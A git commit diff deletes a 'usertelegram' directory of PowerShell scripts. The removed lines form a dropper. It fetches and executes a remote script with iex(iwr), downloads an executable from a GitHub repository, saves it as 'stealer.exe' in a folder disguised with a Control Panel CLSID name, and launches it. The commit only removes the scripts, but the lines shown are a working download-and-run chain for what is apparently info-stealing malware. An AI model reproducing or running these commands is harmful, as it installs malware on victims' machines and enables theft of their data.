eff898fce0154535eceff62a7437bee6ba049609
43a1723 <hai1723notgay@gmail.com>
2024-07-01 17:01:31 +0700

    Delete usertelegram directory

--- usertelegram/1086990476411932722/main.ps1
+++
@@ -1,4 +0,0 @@
-iex (iwr -uri "https://raw.githubusercontent.com/43a1723/test/main/usertelegram/config.ps1" -useb)
-
-Invoke-WebRequest -Uri "https://raw.githubusercontent.com/43a1723/test/main/usertelegram/1086990476411932722/GAYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYY_protected.exe" -OutFile "$temp\stealer.exe"
-Start-Process -FilePath "$temp\stealer.exe"
--- usertelegram/config.ps1
+++
@@ -1,4 +0,0 @@
-$rdir = "C:\Users\hai1723"
-$dir = "$rdir.{21EC2020-3AEA-1069-A2DD-08002B30309D}"
-$temp = "$dir\temp\$userid"
-New-Item -ItemType Directory -Path $temp
